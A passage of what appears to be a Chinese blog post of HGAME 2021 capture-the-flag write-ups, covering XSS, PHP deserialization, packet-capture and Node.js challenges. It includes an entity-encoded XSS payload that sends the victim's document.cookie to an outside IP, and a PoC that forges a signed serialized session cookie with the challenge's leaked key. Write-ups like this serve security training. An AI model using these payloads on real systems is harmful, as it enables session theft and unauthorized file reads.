class="string">&quot;[&lt;&gt;]&quot;</span>, <span class="string">&quot;&quot;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_code</span>():</span></span><br><span class="line">    hashobj = hashlib.md5()</span><br><span class="line">    hashobj.update(bytes(str(time.time()), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    code_hash = hashobj.hexdigest()[:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">return</span> code_hash</span><br></pre></td></tr></table></figure>
+
+<p>escape_index函数这不就是个后门吗？ 并且有csp</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>只允许引用来自同端口，同域名，同协议的资源</p>
+<p>和上面串起来了 构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;/preview&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再提交bot就行了 有点懵 bot是带着我们的session访问的？不管了</p>
+<h4 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h4><p>还是可以利用iframe标签引入资源</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;/preview&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和上面基本一样 唯一改变的地方就是替换变成搜索了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.get(<span class="string">&quot;/contents&quot;</span>).done(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> content = <span class="string">&quot;aaa&quot;</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> output = <span class="built_in">document</span>.getElementById(<span class="string">&quot;output&quot;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (content !== <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">let</span> substr = <span class="keyword">new</span> <span class="built_in">RegExp</span>(content, <span class="string">&#x27;g&#x27;</span>)</span></span><br><span class="line"><span class="handlebars"><span class="xml">                    div.innerHTML = data[i].replace(substr, `<span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">&quot;search_result&quot;</span>&gt;</span>$&#123;content&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span>`)</span></span></span><br><span class="line">                    output.appendChild(div)</span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">                    output.appendChild(div)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里利用就是$1 即正则匹配的分组 默认情况下是 有一些标签的</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210220120029141.png" alt="image-20210220120029141"></p>
+<p>利用正则匹配分组将<code>&lt;</code>和<code>&gt;</code>匹配出来 拼接过去就行</p>
+<p>payload 直接用script貌似不行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.&#123;1&#125;)iframe src&#x3D;(.*?)preview(.*?) (.&#123;1&#125;)|$1img src&#x3D;&#39;&#x2F;aaa&#39; onerror&#x3D;&#39;alert(1)&#39;$4|aaaa</span><br></pre></td></tr></table></figure>
+
+<p>发现可以弹窗 替换成盗cookie的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.&#123;1&#125;)iframe src&#x3D;(.*?)preview(.*?) (.&#123;1&#125;)|$1img src&#x3D;&#39;&#x2F;aaa&#39; onerror&#x3D;&#39;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;period;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;equals;&amp;apos;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;colon;&amp;sol;&amp;sol;&amp;#49;&amp;#48;&amp;#51;&amp;period;&amp;#49;&amp;#53;&amp;#50;&amp;period;&amp;#49;&amp;#51;&amp;#50;&amp;period;&amp;#49;&amp;#54;&amp;colon;&amp;#57;&amp;#48;&amp;#48;&amp;#48;&amp;sol;&amp;quest;&amp;apos;&amp;plus;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;period;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&#39;$4|aaaa</span><br></pre></td></tr></table></figure>
+
+<p>实体编码那部分是</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.location=<span class="string">&#x27;http://1.1.1.1:9000/?&#x27;</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>
+
+<h4 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h4><p>.git泄露  </p>
+<p><strong>simulator.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Simulator</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $session;</span><br><span class="line">    <span class="keyword">public</span> $cardsPool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;session = <span class="keyword">new</span> Session();</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists(<span class="string">&quot;session&quot;</span>, $_COOKIE))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;session-&gt;extract($_COOKIE[<span class="string">&quot;session&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cardsPool = <span class="keyword">new</span> CardsPool(<span class="string">&quot;./pool.php&quot;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cardsPool-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">$count</span>)</span>&#123;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$count; $i++)&#123;</span><br><span class="line">            $card = <span class="keyword">$this</span>-&gt;cardsPool-&gt;draw();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($card[<span class="string">&quot;stars&quot;</span>] == <span class="number">6</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session-&gt;set(<span class="string">&#x27;&#x27;</span>, $card[<span class="string">&quot;No&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $result[] = $card;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;session-&gt;save();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getLegendary</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $six = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;session-&gt;getAll();</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            $six[] = <span class="keyword">$this</span>-&gt;cardsPool-&gt;cards[<span class="number">6</span>][$item];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $six;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cards;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filePath</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = $filePath;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Cards pool file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rand = mt_rand(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">        $level = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($rand &gt;= <span class="number">1</span> &amp;&amp; $rand &lt;= <span class="number">42</span>) &#123;</span><br><span class="line">            $level = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">43</span> &amp;&amp; $rand &lt;= <span class="number">90</span>) &#123;</span><br><span class="line">            $level = <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">91</span> &amp;&amp; $rand &lt;= <span class="number">99</span>) &#123;</span><br><span class="line">            $level = <span class="number">5</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand == <span class="number">100</span>) &#123;</span><br><span class="line">            $level = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $rand_key = array_rand(<span class="keyword">$this</span>-&gt;cards[$level]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;stars&quot;</span> =&gt; $level,</span><br><span class="line">            <span class="string">&quot;No&quot;</span> =&gt; $rand_key,</span><br><span class="line">            <span class="string">&quot;card&quot;</span> =&gt; <span class="keyword">$this</span>-&gt;cards[$level][$rand_key]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cards = <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sessionData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> SECRET_KEY = <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$key, $value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[] = $value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[$key] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sessionData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $serialized = serialize(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">        $sign = base64_encode(md5($serialized . <span class="built_in">self</span>::SECRET_KEY));</span><br><span class="line">        $value = base64_encode($serialized) . <span class="string">&quot;.&quot;</span> . $sign;</span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">&quot;session&quot;</span>,$value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span>(<span class="params">$session</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $sess_array = explode(<span class="string">&quot;.&quot;</span>, $session);</span><br><span class="line">        $data = base64_decode($sess_array[<span class="number">0</span>]);</span><br><span class="line">        $sign = base64_decode($sess_array[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($sign === md5($data . <span class="built_in">self</span>::SECRET_KEY))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData = unserialize($data);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Go away! You hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg=<span class="string">&quot;坏坏liki到此一游&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>index.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">&quot;simulator.php&quot;</span>);</span><br><span class="line">$simulator = <span class="keyword">new</span> Simulator();</span><br><span class="line">$cards = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;draw&quot;</span>]))&#123;</span><br><span class="line">    $cards = $simulator-&gt;draw($_POST[<span class="string">&quot;draw&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>盲猜反序列化</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210215193353483.png" alt="image-20210215193353483"></p>
+<p>找<code>__toString</code> 有可能会有任意文件读取</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210215193426050.png" alt="image-20210215193426050"></p>
+<p>这不很简单吗？ 找反序列化点吧</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210215193524438.png" alt="image-20210215193524438"></p>
+<p>看下那里调用了extract方法</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210215193602880.png" alt="image-20210215193602880"></p>
+<p><strong>poc:</strong> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="keyword">new</span> CardsPool();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Eeeeeeevallllllll();</span><br><span class="line"><span class="comment">// echo base64_encode(serialize($a));</span></span><br><span class="line">$key = <span class="string">&#x27;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a)).<span class="string">&#x27;.&#x27;</span>.base64_encode(md5(serialize($a).$key));</span><br></pre></td></tr></table></figure>
+
+<h3 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h3><h4 id="A-R-K"><a href="#A-R-K" class="headerlink" title="A R K"></a>A R K</h4><p>发现有ftp 筛选ftp-data</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201238692.png" alt="image-20210216201238692"></p>
+<p>追踪tcp流发现</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201303158.png" alt="image-20210216201303158"></p>
+<p>ssl log 保存到文件 编辑-&gt;首选项-&gt;协议-&gt;TLS</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201428549.png" alt="image-20210216201428549"></p>
+<p>再次筛选http 发现就有东西了</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201504135.png" alt="image-20210216201504135"></p>
+<p>导出http对象 发现有串base64加密的字符串 追踪http流也能得到</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201721367.png" alt="image-20210216201721367"></p>
+<p>解码得到</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201741003.png" alt="image-20210216201741003"></p>
+<p>压缩包 保存下来 直接打开提示</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210216201830736.png" alt="image-20210216201830736"></p>
+<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="漫无止境的星期日"><a href="#漫无止境的星期日" class="headerlink" title="漫无止境的星期日"></a>漫无止境的星期日</h4><p>nodejs 原型链污染 + ejs模板注入 查看源代码发现<code>/static/www.zip</code>得到源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">&#x27;/static&#x27;</span>, express.static(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    secret: randomize(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123; <span class="attr">name</span>: <span class="string">&quot;&quot;</span>, <span class="attr">discription</span>: <span class="string">&quot;&quot;</span> &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.ip === <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        data.crying = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key !== <span class="string">&quot;crying&quot;</span>) &#123;</span><br><span class="line">                data[key] = 